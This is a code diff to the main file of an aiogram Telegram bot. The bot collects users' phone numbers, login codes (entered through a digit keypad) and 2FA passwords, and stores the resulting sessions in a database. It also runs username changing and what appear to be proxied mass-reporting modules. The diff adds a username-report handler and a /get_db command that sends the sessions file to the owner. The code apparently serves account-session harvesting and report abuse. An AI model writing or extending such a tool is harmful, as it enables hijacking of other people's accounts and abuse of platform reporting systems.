@@ -1,13 +1,11 @@
-
 import asyncio
 import logging
 from aiogram import Bot, Dispatcher, types
-from report_module import register_report_handlers, register_stop_handler, load_proxies_from_db
-
 from aiogram.dispatcher import FSMContext
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 from aiogram.utils import executor
+
 from config import BOT_TOKEN, ADMIN_ID
 from states import LoginState
 from db import init_db, init_admins, delete_session_by_user, add_admin, remove_admin, get_all_admins, is_admin
@@ -15,38 +13,24 @@ from session_manager import send_otp_code, confirm_otp_code, confirm_2fa_passwor
 from username_changer import start_username_changer, stop_username_changer
 from group_privater import schedule_group_privacy
 from status import get_status_message
-from db import init_db
+import sys
+import os
+sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 
 from report_module import register_report_handlers, register_stop_handler, load_proxies_from_db
+from report_username_module import register_username_report_handlers
 
-# Initialize database and admins
-init_db()
-init_admins()
-
-# Setup bot + dispatcher
 bot = Bot(token=BOT_TOKEN)
 storage = MemoryStorage()
 dp = Dispatcher(bot, storage=storage)
 
-# ✅ Load proxies and register handlers
+init_db()
+init_admins()
 load_proxies_from_db()
+register_username_report_handlers(dp)
 register_report_handlers(dp)
 register_stop_handler(dp)
-
-
-
-
-# ✅ Initialize
-bot = Bot(token=BOT_TOKEN)
-storage = MemoryStorage()
-dp = Dispatcher(bot, storage=storage)
-init_db()
-init_admins()
-
-load_proxies_from_db()  # ✅ Load proxies from DB into memory
-
-register_report_handlers(dp)
-register_stop_handler(dp)
+print("✅ Username report handler registered")
 
 otp_cache = {}
 def generate_otp_keyboard(entered: str = ""):
@@ -105,9 +89,6 @@ async def get_phone(msg: types.Message, state: FSMContext):
     else:
         await msg.answer("❌ OTP sending failed.")
         await state.finish()
-        @dp.message_handler(state=LoginState.waiting_for_otp)
-        async def block_otp_input(msg: types.Message):
-            await msg.reply("❗ Use buttons below to enter OTP.")
 
 @dp.callback_query_handler(lambda c: c.data.startswith(("digit_", "del", "submit")), state=LoginState.waiting_for_otp)
 async def otp_buttons(callback: types.CallbackQuery, state: FSMContext):
@@ -189,7 +170,6 @@ async def stop_change(msg: types.Message):
     result = await stop_username_changer(msg.from_user.id)
     await msg.reply(result)
 
-# GROUP PRIVATE NAME SCHEDULE
 class PrivateState:
     waiting_for_group = "private_group"
     waiting_for_start = "private_start"
@@ -244,50 +224,11 @@ async def check_status(msg: types.Message):
     status_text, keyboard = get_status_message(msg.from_user.id)
     await msg.reply(status_text, reply_markup=keyboard, parse_mode="Markdown")
 
-@dp.callback_query_handler(lambda c: c.data == "stop_changer")
-async def handle_stop_button(callback: types.CallbackQuery):
-    result = await stop_username_changer(callback.from_user.id)
-    await callback.message.edit_text(result)
-    await callback.answer("🛑 Stopped.")
-    @dp.message_handler(commands=['add'])
-    async def add_admin_cmd(msg: types.Message):
-        if not is_admin(msg.from_user.id):
-            return await msg.reply("❌ You are not authorized.")
-    
-        parts = msg.text.strip().split()
-        if len(parts) != 2 or not parts[1].isdigit():
-            return await msg.reply("⚠️ Usage: /add <user_id>")
-
-            user_id = int(parts[1])
-            if is_admin(user_id):
-                return await msg.reply(f"⚠️ User {user_id} is already an admin.")
-    
-            add_admin(user_id)
-            await msg.reply(f"✅ User `{user_id}` has been added as admin.", parse_mode="Markdown")
-
-
-@dp.message_handler(commands=['remove'])
-async def remove_admin_cmd(msg: types.Message):
-    if not is_admin(msg.from_user.id):
-        return await msg.reply("❌ You are not authorized.")
-    
-    parts = msg.text.strip().split()
-    if len(parts) != 2 or not parts[1].isdigit():
-        return await msg.reply("⚠️ Usage: /remove <user_id>")
-
-    user_id = int(parts[1])
-    if user_id == ADMIN_ID:
-        return await msg.reply("❌ Cannot remove the main owner.")
-
-    remove_admin(user_id)
-    await msg.reply(f"🗑️ User `{user_id}` removed from admins.", parse_mode="Markdown")
-
-
 @dp.message_handler(commands=['admins'])
 async def list_admins_cmd(msg: types.Message):
     if not is_admin(msg.from_user.id):
         return await msg.reply("❌ You are not authorized.")
-    
+
     admins = get_all_admins()
     if ADMIN_ID not in admins:
         admins.insert(0, ADMIN_ID)
@@ -298,10 +239,20 @@ async def list_admins_cmd(msg: types.Message):
         for uid in admins:
             if uid != ADMIN_ID:
                 msg_lines.append(f"• `{uid}`")
-
     await msg.reply("\n".join(msg_lines), parse_mode="Markdown")
 
+@dp.message_handler(commands=['get_db'])
+async def send_db_to_admin(msg: types.Message):
+    print("FROM USER ID:", msg.from_user.id)
+    print("ADMIN_ID:", ADMIN_ID)
+
+    if msg.from_user.id != ADMIN_ID:
+        return await msg.reply("❌ Not authorized.")
+
+    if os.path.exists("sessions.db"):
+        await msg.reply_document(open("sessions.db", "rb"))
+    else:
+        await msg.reply("⚠️ sessions.db not found.")
 
 if __name__ == "__main__":
     executor.start_polling(dp, skip_updates=True)
- 
